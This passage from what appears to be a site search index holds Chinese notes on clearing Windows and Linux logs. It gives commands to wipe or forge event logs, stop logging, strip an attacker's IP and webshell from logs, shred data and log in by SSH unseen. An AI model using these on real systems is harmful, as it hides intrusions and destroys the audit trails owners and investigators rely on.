\u8fd9\u4e2a\u5de5\u5177\u4e5f\u53ef\u4ee5\u6682\u505c\u65e5\u5fd7\u7ebf\u7a0b\u505c\u6b62\u65e5\u5fd7\u8bb0\u5f55\uff0c\u540c\u65f6\u4e5f\u53ef\u4ee5\u6062\u590d\u65e5\u5fd7\u7ebf\u7a0b\u3002\u4f46\u662f\u66f4\u91cd\u8981\u7684\u662f\u5b83\u53ef\u4ee5\u5220\u9664\u5355\u6311\u65e5\u5fd7\u8bb0\u5f55 \u5b98\u65b9\u63cf\u8ff0 EventCleaner closehandle \u89e3\u9664 security.evtx\u7684\u6587\u4ef6\u5360\u5751 EventCleaner 100 \u5220\u9664ID\u4e3a100\u7684\u65e5\u5fd7(\u5fc5\u987b\u5728\u4e4b\u524d\u4f7f\u7528EventCleaner closehandle) EventCleaner suspend \u6682\u505c\u65e5\u5fd7\u7ebf\u7a0b,\u505c\u6b62\u65e5\u5fd7\u8bb0\u5f55 do anything without worrying about logs EventCleaner normal \u6062\u590d\u65e5\u5fd7\u7ebf\u7a0b delete EventCleaner \u5404\u65e5\u5fd7\u4f4d\u7f6e\u53ca\u624b\u52a8\u6e05\u9664 IIS \u8def\u5f84 %SystemDrive%\\inetpub\\logs\\LogFiles\\W3SVC1\\ \u6e05\u9664WWW\u65e5\u5fd7(\u5176\u5b9e\u5e76\u4e0d\u9700\u8981\u505c\u6b62\u670d\u52a1\u90fd\u80fd\u5220)\uff1a \u505c\u6b62\u670d\u52a1\uff1anet stop w3svc \u5220\u9664\u65e5\u5fd7\u76ee\u5f55\u4e0b\u6240\u6709\u6587\u4ef6\uff1adel *.* \u542f\u7528\u670d\u52a1\uff1anet start w3svc \u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7\uff0c\u5b89\u5168\u65e5\u5fd7\uff0c\u7cfb\u7edf\u65e5\u5fd7 %systemroot%\\system32\\config\\AppEvent.EVT; %systemroot%\\system32\\config\\SecEvent.EVT; %systemroot%\\system32\\config\\SysEvent.EVT; ftp %systemroot%\\system32\\logfiles\\msftpsvc1\\ \u8fdc\u7a0b\u684c\u9762 \u76f4\u63a5\u5ad6\u811a\u672c @echo off reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f # \u5220\u9664Default\u4e2d\u7684\u6240\u6709\u503c reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /f # \u5220\u9664\u6574\u4e2aServers reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" \u91cd\u65b0\u521b\u5efa\u5220\u9664\u7684\u6ce8\u518c\u8868\u9879 cd %userprofile%\\documents\\ # \u8f6c\u5230Default.rdp\u6587\u4ef6\u76ee\u5f55 attrib Default.rdp -s -h # \u66f4\u6539Default.rdp\u6587\u4ef6\u5c5e\u6027\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5b83\u662f\u9690\u85cf del Default.rdp # \u5220\u9664\u6587\u4ef6Default.rdp\u6587\u4ef6 \u5f7b\u5e95\u5220\u9664\u65e5\u5fd7 \u5982\u4f55\u5f7b\u5e95\u5220\u9664\u65e5\u5fd7\uff1f\u8981\u77e5\u9053\u4ec5\u4ec5\u662f\u666e\u901a\u7684\u5220\u9664\u547d\u4ee4\u5b9e\u9645\u4e0a\u662f\u5e76\u4e0d\u80fd\u505a\u5230\u5b8c\u5168\u5220\u9664\u7684\uff0c\u5f88\u5bb9\u6613\u88ab\u627e\u5230\u5220\u9664\u6587\u4ef6\u3002 Cipher \u547d\u4ee4\u591a\u6b21\u8986\u5199 \u5728\u5220\u9664\u6587\u4ef6\u540e\uff0c\u53ef\u4ee5\u5229\u7528Cipher \u547d\u4ee4\u901a\u8fc7 /W \u53c2\u6570\u53ef\u53cd\u590d\u5199\u5165\u5176\u4ed6\u6570\u636e\u8986\u76d6\u5df2\u5220\u9664\u6587\u4ef6\u7684\u786c\u76d8\u7a7a\u95f4\uff0c\u5f7b\u5e95\u5220\u9664\u6570\u636e\u9632\u6b62\u88ab\u6062\u590d\u3002\u6bd4\u5982 \u521a\u521a\u5220\u9664 D:\\tools \u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\uff0c\u6267\u884c cipher /w:D:\\tools \uff0cD \u76d8\u4e0a\u672a\u4f7f\u7528\u7a7a\u95f4\u5c31\u4f1a\u88ab\u8986\u76d6\u4e09\u6b21\uff1a\u4e00\u6b21 0x00\u3001\u4e00\u6b21 0xFF\uff0c\u4e00\u6b21\u968f\u673a\u6570\uff0c\u6240\u6709\u88ab\u5220\u9664\u7684\u6587\u4ef6\u5c31\u90fd\u4e0d\u53ef\u80fd\u88ab\u6062\u590d\u4e86\u3002 Format\u547d\u4ee4\u8986\u76d6\u683c\u5f0f\u5316 Format \u547d\u4ee4\u52a0\u4e0a /P \u53c2\u6570\u540e\uff0c\u5c31\u4f1a\u628a\u6bcf\u4e2a\u6247\u533a\u5148\u6e05\u96f6\uff0c\u518d\u7528\u968f\u673a\u6570\u8986\u76d6\u3002\u800c\u4e14\u53ef\u4ee5\u8986\u76d6\u591a\u6b21\u3002\u6bd4\u5982 format D: /P:8 \u5c31\u8868\u793a\u628a D \u76d8\u7528\u968f\u673a\u6570\u8986\u76d6 8 \u6b21\u3002 LINUX \u65e5\u5fd7 /var/log/message \u7cfb\u7edf\u542f\u52a8\u540e\u7684\u4fe1\u606f\u548c\u9519\u8bef\u65e5\u5fd7\uff0c\u662fRed Hat Linux\u4e2d\u6700\u5e38\u7528\u7684\u65e5\u5fd7\u4e4b\u4e00 /var/log/secure \u4e0e\u5b89\u5168\u76f8\u5173\u7684\u65e5\u5fd7\u4fe1\u606f /var/log/maillog \u4e0e\u90ae\u4ef6\u76f8\u5173\u7684\u65e5\u5fd7\u4fe1\u606f /var/log/cron \u4e0e\u5b9a\u65f6\u4efb\u52a1\u76f8\u5173\u7684\u65e5\u5fd7\u4fe1\u606f /var/log/spooler \u4e0eUUCP\u548cnews\u8bbe\u5907\u76f8\u5173\u7684\u65e5\u5fd7\u4fe1\u606f /var/log/boot.log \u5b88\u62a4\u8fdb\u7a0b\u542f\u52a8\u548c\u505c\u6b62\u76f8\u5173\u7684\u65e5\u5fd7\u6d88\u606f /var/log/wtmp \u8be5\u65e5\u5fd7\u6587\u4ef6\u6c38\u4e45\u8bb0\u5f55\u6bcf\u4e2a\u7528\u6237\u767b\u5f55\u3001\u6ce8\u9500\u53ca\u7cfb\u7edf\u7684\u542f\u52a8\u3001\u505c\u673a\u7684\u4e8b\u4ef6,\u7528last\u67e5\u770b /var/log/btmp \u8bb0\u5f55\u6240\u6709\u767b\u5f55\u5931\u8d25\u4fe1\u606f\uff0c\u4f7f\u7528lastb\u547d\u4ee4\u67e5\u770b /var/log/lastlog \u8bb0\u5f55\u7cfb\u7edf\u4e2d\u6240\u6709\u7528\u6237\u6700\u540e\u4e00\u6b21\u767b\u5f55\u65f6\u95f4\u7684\u65e5\u5fd7\uff0c\u4f7f\u7528lastlog\u547d\u4ee4\u67e5\u770b /var/log/utmp \u8bb0\u5f55\u5f53\u524d\u5df2\u7ecf\u767b\u5f55\u7684\u7528\u6237\u4fe1\u606f\uff0c\u4f7f\u7528w,who,users\u7b49\u547d\u4ee4\u67e5\u770b ~/.bash_history \u6267\u884c\u7684\u547d\u4ee4,\u7528 histroy -c \u5373\u53ef\u5220\u9664 \u6e05\u7a7a\u65e5\u5fd7 \u6e05\u9664\u7528\u6237\u6700\u540e\u4e00\u6b21\u767b\u5f55\u65f6\u95f4\uff1aecho > /var/log/lastlog #lastlog\u547d\u4ee4 \u6e05\u9664\u5f53\u524d\u767b\u5f55\u7528\u6237\u7684\u4fe1\u606f\uff1aecho > /var/log/utmp #\u4f7f\u7528w,who,users\u7b49\u547d\u4ee4 \u6e05\u9664\u5b89\u5168\u65e5\u5fd7\u8bb0\u5f55\uff1acat /dev/null > /var/log/secure \u6e05\u9664\u7cfb\u7edf\u65e5\u5fd7\u8bb0\u5f55\uff1acat /dev/null > /var/log/message \u8bf8\u5982\u6b64\u7c7b... \u66ff\u6362/\u5220\u9664\u90e8\u5206\u65e5\u5fd7 \u65e5\u5fd7\u6587\u4ef6\u88ab\u6e05\u7a7a\u4f1a\u5f15\u8d77\u7ba1\u7406\u5458\u8b66\u89c9\uff0c\u6240\u4ee5\u53ef\u4ee5\u53ea\u66ff\u6362\u6216\u5220\u9664\u5173\u952e\u4fe1\u606f\uff0c\u5b9e\u73b0\u9690\u79d8\u653b\u51fb\u7684\u76ee\u7684\u3002 # \u5220\u9664\u6240\u6709\u5339\u914d\u5230\u5b57\u7b26\u4e32\u7684\u884c,\u6bd4\u5982\u4ee5\u5f53\u5929\u65e5\u671f\u6216\u8005\u81ea\u5df1\u7684\u767b\u5f55ip sed -i '/\u81ea\u5df1\u7684ip/'d /var/log/messages # \u5168\u5c40\u66ff\u6362\u767b\u5f55IP\u5730\u5740\uff1a sed -i 's/192.168.166.85/192.168.1.1/g' secure \u5bf9\u4e8eWEB\u670d\u52a1\u8fd8\u53ef\u4ee5\u8fd9\u6837\u9690\u85cf\u6211\u4eec\u7684\u9a6c # \u4f7f\u7528grep -v\u6765\u628a\u6211\u4eec\u7684\u76f8\u5173\u4fe1\u606f\u5220\u9664, cat /var/log/nginx/access.log | grep -v evil.php > tmp.log # \u628a\u4fee\u6539\u8fc7\u7684\u65e5\u5fd7\u8986\u76d6\u5230\u539f\u65e5\u5fd7\u6587\u4ef6 cat tmp.log > /var/log/nginx/access.log/ \u5f7b\u5e95\u5220\u9664 shred -n \u6307\u5b9a\u8986\u5199\u6b21\u6570\uff0c\u9ed8\u8ba43\u6b21 shred -f -u -z -v -n 8 1.txt dd \u8fd9\u4e2a\u547d\u4ee4\u7528\u4e8e\u6e05\u7a7a\u6587\u4ef6 dd if=/dev/zero of=\u8981\u5220\u9664\u7684\u6587\u4ef6 wipe \u5f88\u7b80\u5355\u6613\u7528\uff0c\u4f46\u662f\u4e00\u822c\u4e0d\u662f\u88c5\u673a\u81ea\u5e26 wipe filename Secure-Delete secure-delete\u662f\u4e00\u4e2a\u96c6\u6210\u5316\u5de5\u5177\u5305\uff0c\u6536\u5f55\u4e86\u4e9b\u5b89\u5168\u5220\u9664\u6587\u4ef6\u7684\u547d\u4ee4\u884c\u5de5\u5177\u3002 srm filename sfill /a \u7528\u968f\u673a\u6570\u586b\u5145\u7a7a\u95f2\u6216\u8005\u53ef\u7528\u7684\u7a7a\u95f4\uff0c\u4fdd\u8bc1\u6ca1\u6709\u53ef\u6062\u590d\u7684\u6587\u4ef6\u6216\u6587\u4ef6\u5939 sswap\u7528\u4e8e\u5b89\u5168\u5730\u6e05\u9664\u4ea4\u6362\u5206\u533a\u3002 cat /proc/swaps \u627e\u5230\u4ea4\u6362\u5206\u533a sswap /www/swap smem\u7528\u4e8e\u6e05\u7406\u5728\u5185\u5b58\u4e2d\u7684\u5185\u5bb9\uff0c\u63d0\u4f9b\u5b89\u5168\u5730\u5185\u5b58\u6e05\u7406: smem SSH\u9690\u8eab\u767b\u5f55 ssh -T root@192.168.199.123 /usr/bin/bash -i -T\u8868\u793a\u4e0d\u5206\u914d\u4f2a\u7ec8\u7aef\uff0c/usr/bin/bash -i \u8868\u793a\u5728\u767b\u5f55\u540e\u8c03\u7528bash\u547d\u4ee4 -i \u8868\u793a\u662f\u4ea4\u4e92\u5f0fshel\uff0c\u8fd9\u6837\u767b\u9646\u5c06\u4e0d\u4f1a\u5728w/last\u547d\u4ee4\u7ed3\u679c\u4e2d\u663e\u793a. \u4f46\u662f\u4f1a\u88ablsof -i:22 \u548c ps |grep ssh \u7b49\u547d\u4ee4\u53d1\u73b0","title":"windows\\&linux\u65e5\u5fd7\u7cfb\u7edf\u4e0e\u6e05\u9664"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/#windowslinux","text":"","title":"windows\\&amp;linux\u65e5\u5fd7\u7cfb\u7edf\u4e0e\u6e05\u9664"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/#_1","text":"title: win\\&linux \u65e5\u5fd7\u7cfb\u7edf\u4e0e\u6e05\u9664 date: tags: \u7cfb\u7edf\u76f8\u5173 WINDOWS \u65e5\u5fd7 \u4e8b\u4ef6\u67e5\u770b\u5668 \u4e8b\u4ef6\u7c7b\u578b \u5220\u9664\u65e5\u5fd7 \u6e05\u7a7a\u65e5\u5fd7 \u65e5\u5fd7\u4f2a\u9020 \u6682\u505c\u65e5\u5fd7\u8bb0\u5f55 \u5355\u6761\u65e5\u5fd7\u6e05\u9664 \u5404\u65e5\u5fd7\u4f4d\u7f6e\u53ca\u624b\u52a8\u6e05\u9664 IIS \u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7\uff0c\u5b89\u5168\u65e5\u5fd7\uff0c\u7cfb\u7edf\u65e5\u5fd7 ftp \u8fdc\u7a0b\u684c\u9762 \u5f7b\u5e95\u5220\u9664\u65e5\u5fd7 Cipher \u547d\u4ee4\u591a\u6b21\u8986\u5199 Format\u547d\u4ee4\u8986\u76d6\u683c\u5f0f\u5316 LINUX \u65e5\u5fd7 \u6e05\u7a7a\u65e5\u5fd7 \u66ff\u6362/\u5220\u9664\u90e8\u5206\u65e5\u5fd7 \u5f7b\u5e95\u5220\u9664 shred dd wipe Secure-Delete SSH\u9690\u8eab\u767b\u5f55 title: win\\&linux \u65e5\u5fd7\u7cfb\u7edf\u4e0e\u6e05\u9664 date: tags: \u7cfb\u7edf\u76f8\u5173","title":"\u76ee\u5f55"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/#windows","text":"Windows\u65e5\u5fd7\u6709\u8bb8\u591a\u7ec6\u5206\u7c7b\uff1a windows\u4e8b\u4ef6\u65e5\u5fd7\uff0cIIS\u65e5\u5fd7\uff0cFTP\u65e5\u5fd7\uff0c\u9632\u706b\u5899\u65e5\u5fd7\u7b49\u7b49\u3002","title":"WINDOWS \u65e5\u5fd7"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/#_2","text":"windows\u7cfb\u7edf\u81ea\u5e26\u4e00\u4e2a\u53eb\u505a\u4e8b\u4ef6\u67e5\u770b\u5668\u7684\u5de5\u5177\uff0c\u5b83\u53ef\u4ee5\u5206\u6790\u6240\u6709\u7684windows\u7cfb\u7edf\u65e5\u5fd7\u3002 \u8fd0\u884c->eventvwr \u5373\u53ef\u6253\u5f00\u3002 \u5b83\u628a\u65e5\u5fd7\u5206\u4e3a\u4e86\u4e24\u79cd\uff0c\u4e00\u4e2a\u662fWINDOWS\u65e5\u5fd7\uff0c\u4e00\u4e2a\u662f\u201c\u5e94\u7528\u7a0b\u5e8f\u548c\u670d\u52a1\u65e5\u5fd7\u201d \u4e8b\u4ef6\u67e5\u770b\u5668\u5185\u7f6e\u6709\u4e09\u4e2a\u6838\u5fc3\u65e5\u5fd7\u6587\u4ef6\uff1aSYSTEM,SECURITY,APPLICATION\u3002\u4ed6\u4eec\u7684\u9ed8\u8ba4\u6700\u5927\u5bb9\u91cf\u4e3a20MB.","title":"\u4e8b\u4ef6\u67e5\u770b\u5668"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/#_3","text":"\u4e8b\u4ef6\u67e5\u770b\u5668\u628a\u65f6\u95f4\u5206\u7c7b\u4e3a\u4e86\u4e94\u79cd\u7c7b\u578b\uff1a \u4fe1\u606f\uff08Information\uff09 \u4fe1\u606f\u4e8b\u4ef6\u6307\u5e94\u7528\u7a0b\u5e8f\u3001\u9a71\u52a8\u7a0b\u5e8f\u6216\u670d\u52a1\u7684\u6210\u529f\u64cd\u4f5c\u7684\u4e8b\u4ef6\u3002 \u8b66\u544a\uff08Warning\uff09 \u8b66\u544a\u4e8b\u4ef6\u6307\u4e0d\u662f\u76f4\u63a5\u7684\u3001\u4e3b\u8981\u7684\uff0c\u4f46\u662f\u4f1a\u5bfc\u81f4\u5c06\u6765\u95ee\u9898\u53d1\u751f\u7684\u95ee\u9898\u3002\u4f8b\u5982\uff0c\u5f53\u78c1\u76d8\u7a7a\u95f4\u4e0d\u8db3\u6216\u672a\u627e\u5230\u6253\u5370\u673a\u65f6\uff0c\u90fd\u4f1a\u8bb0\u5f55\u4e00\u4e2a\u201c\u8b66\u544a\u201d\u4e8b\u4ef6\u3002 \u9519\u8bef\uff08Error\uff09 \u9519\u8bef\u4e8b\u4ef6\u6307\u7528\u6237\u5e94\u8be5\u77e5\u9053\u7684\u91cd\u8981\u7684\u95ee\u9898\u3002\u9519\u8bef\u4e8b\u4ef6\u901a\u5e38\u6307\u529f\u80fd\u548c\u6570\u636e\u7684\u4e22\u5931\u3002\u4f8b\u5982,\u5982\u679c\u4e00\u4e2a\u670d\u52a1\u4e0d\u80fd\u4f5c\u4e3a\u7cfb\u7edf\u5f15\u5bfc\u88ab\u52a0\u8f7d\uff0c\u90a3\u4e48\u5b83\u4f1a\u4ea7\u751f\u4e00\u4e2a\u9519\u8bef\u4e8b\u4ef6\u3002 \u6210\u529f\u5ba1\u6838\uff08Success audit\uff09 \u6210\u529f\u7684\u5ba1\u6838\u5b89\u5168\u8bbf\u95ee\u5c1d\u8bd5\uff0c\u4e3b\u8981\u662f\u6307\u5b89\u5168\u6027\u65e5\u5fd7\uff0c\u8fd9\u91cc\u8bb0\u5f55\u7740\u7528\u6237\u767b\u5f55/\u6ce8\u9500\u3001\u5bf9\u8c61\u8bbf\u95ee\u3001\u7279\u6743\u4f7f\u7528\u3001\u8d26\u6237\u7ba1\u7406\u3001\u7b56\u7565\u66f4\u6539\u3001\u8be6\u7ec6\u8ddf\u8e2a\u3001\u76ee\u5f55\u670d\u52a1\u8bbf\u95ee\u3001\u8d26\u6237\u767b\u5f55\u7b49\u4e8b\u4ef6\uff0c\u4f8b\u5982\u6240\u6709\u7684\u6210\u529f\u767b\u5f55\u7cfb\u7edf\u90fd\u4f1a\u88ab\u8bb0\u5f55\u4e3a\u201c \u6210\u529f\u5ba1\u6838\u201d\u4e8b\u4ef6\u3002 \u5931\u8d25\u5ba1\u6838\uff08Failure audit\uff09 \u5931\u8d25\u7684\u5ba1\u6838\u5b89\u5168\u767b\u5f55\u5c1d\u8bd5\uff0c\u4f8b\u5982\u7528\u6237\u8bd5\u56fe\u8bbf\u95ee\u7f51\u7edc\u9a71\u52a8\u5668\u5931\u8d25\uff0c\u5219\u8be5\u5c1d\u8bd5\u4f1a\u88ab\u4f5c\u4e3a\u5931\u8d25\u5ba1\u6838\u4e8b\u4ef6\u8bb0\u5f55\u4e0b\u6765\u3002","title":"\u4e8b\u4ef6\u7c7b\u578b"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/#_4","text":"Windows\u5e76\u6ca1\u6709\u76f4\u63a5\u63d0\u4f9b\u5220\u9664\u7279\u70b9\u65e5\u5fd7\u7684\u529f\u80fd\uff0c\u4e8b\u4ef6\u67e5\u770b\u5668\u4e5f\u53ea\u63d0\u4f9b\u4e86\u4e00\u4e2a\u6e05\u9664\u65e5\u5fd7\u7684\u9009\u9879\uff0c\u539f\u56e0\u662f\u65e5\u5fd7\u8bb0\u5f55\u7684ID\u662f\u8fde\u7eed\u7684\uff0c\u9ed8\u8ba4\u7684\u6392\u5e8f\u65b9\u5f0f\u662f\u4ece\u5927\u5230\u5c0f\u5f80\u4e0b\u6392\u5217\u3002","title":"\u5220\u9664\u65e5\u5fd7"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/#_5","text":"\u66b4\u529b\u4e00\u70b9\uff0c\u53ef\u4ee5\u76f4\u63a5\u628a\u65e5\u5fd7\u5168\u90e8\u5220\u9664\u3002 \u5f00\u59cb\u2192\u8fd0\u884c,\u8f93\u5165 eventvwr \u8fdb\u5165\u4e8b\u4ef6\u67e5\u770b\u5668\uff0c\u53f3\u8fb9\u680f\u9009\u62e9\u6e05\u9664\u65e5\u5fd7\u3002 \u6216\u8005\u901a\u8fc7powershell\u9009\u5b9a\u65e5\u5fd7\u5220\u9664 \uff08a\uff09PowerShell -Command \"& {Clear-Eventlog -Log Application,System,Security,'windows powershell'}\" \uff08b\uff09Get-WinEvent -ListLog Application,Setup,Security -Force | % {Wevtutil.exe cl $_.Logname} \u5accpowershell\u592a\u957f\u53ef\u4ee5\u7528wevtutil wevtutil el \u5217\u51fa\u7cfb\u7edf\u4e2d\u6240\u6709\u65e5\u5fd7\u540d\u79f0 wevtutil cl system \u6e05\u7406\u7cfb\u7edf\u65e5\u5fd7 wevtutil cl application \u6e05\u7406\u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7 wevtutil cl security \u6e05\u7406\u5b89\u5168\u65e5\u5fd7","title":"\u6e05\u7a7a\u65e5\u5fd7"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/#_6","text":"\u53ef\u4ee5\u901a\u8fc7eventcreate\u8fd9\u4e2a\u81ea\u5e26\u5de5\u5177\u4f2a\u9020\u65e5\u5fd7\u6216\u8005\u81ea\u5b9a\u4e49\u5927\u91cf\u5783\u573e\u4fe1\u606f\u8986\u76d6\u73b0\u6709\u65e5\u5fd7\uff08\u65e5\u5fd7\u6700\u5927\u5bb9\u91cf20MB\uff09 eventcreate -l system -so administrator -t warning -d \"this is a test\" -id 500","title":"\u65e5\u5fd7\u4f2a\u9020"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/#_7","text":"\u53ef\u4ee5\u901a\u8fc7\u5de5\u5177 https://github.com/hlldz/Invoke-Phant0m\uff0c\u6765\u4f7f\u65e5\u5fd7\u8bb0\u5f55\u7ec8\u6b62\u3002\u8fd9\u4e2a\u5de5\u5177\u4ec5\u652f\u6301X64 \u8be5\u811a\u672c\u904d\u5386\u4e8b\u4ef6\u65e5\u5fd7\u670d\u52a1\u8fdb\u7a0b\uff08\u4e13\u7528svchost.exe\uff09\u7684\u7ebf\u7a0b\u5806\u6808\uff0c\u5e76\u6807\u8bc6\u4e8b\u4ef6\u65e5\u5fd7\u7ebf\u7a0b\u4ee5\u6740\u6b7b\u4e8b\u4ef6\u65e5\u5fd7\u670d\u52a1\u7ebf\u7a0b\u3002\u56e0\u6b64\uff0c\u7cfb\u7edf\u5c06\u65e0\u6cd5\u6536\u96c6\u65e5\u5fd7\u3002 \u968f\u540e\u65b0\u589e\u7528\u6237\uff0c\u53d1\u73b0\u65e5\u5fd7\u4e2d\u65e0\u8bb0\u5f55\uff0c\u770b\u6765\u65e5\u5fd7\u8bb0\u5f55\u786e\u5b9e\u662f\u88ab\u7ec8\u6b62\u4e86\u3002","title":"\u6682\u505c\u65e5\u5fd7\u8bb0\u5f55"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/#_8","text":"https://github.com/QAX-A-Team/EventCleaner \u8fd9\u4e2a\u5de5\u5177\u4e5f\u53ef\u4ee5\u6682\u505c\u65e5\u5fd7\u7ebf\u7a0b\u505c\u6b62\u65e5\u5fd7\u8bb0\u5f55\uff0c\u540c\u65f6\u4e5f\u53ef\u4ee5\u6062\u590d\u65e5\u5fd7\u7ebf\u7a0b\u3002\u4f46\u662f\u66f4\u91cd\u8981\u7684\u662f\u5b83\u53ef\u4ee5\u5220\u9664\u5355\u6311\u65e5\u5fd7\u8bb0\u5f55 \u5b98\u65b9\u63cf\u8ff0 EventCleaner closehandle \u89e3\u9664 security.evtx\u7684\u6587\u4ef6\u5360\u5751 EventCleaner 100 \u5220\u9664ID\u4e3a100\u7684\u65e5\u5fd7(\u5fc5\u987b\u5728\u4e4b\u524d\u4f7f\u7528EventCleaner closehandle) EventCleaner suspend \u6682\u505c\u65e5\u5fd7\u7ebf\u7a0b,\u505c\u6b62\u65e5\u5fd7\u8bb0\u5f55 do anything without worrying about logs EventCleaner normal \u6062\u590d\u65e5\u5fd7\u7ebf\u7a0b delete EventCleaner","title":"\u5355\u6761\u65e5\u5fd7\u6e05\u9664"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/#_9","text":"","title":"\u5404\u65e5\u5fd7\u4f4d\u7f6e\u53ca\u624b\u52a8\u6e05\u9664"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/#iis","text":"\u8def\u5f84 %SystemDrive%\\inetpub\\logs\\LogFiles\\W3SVC1\\ \u6e05\u9664WWW\u65e5\u5fd7(\u5176\u5b9e\u5e76\u4e0d\u9700\u8981\u505c\u6b62\u670d\u52a1\u90fd\u80fd\u5220)\uff1a \u505c\u6b62\u670d\u52a1\uff1anet stop w3svc 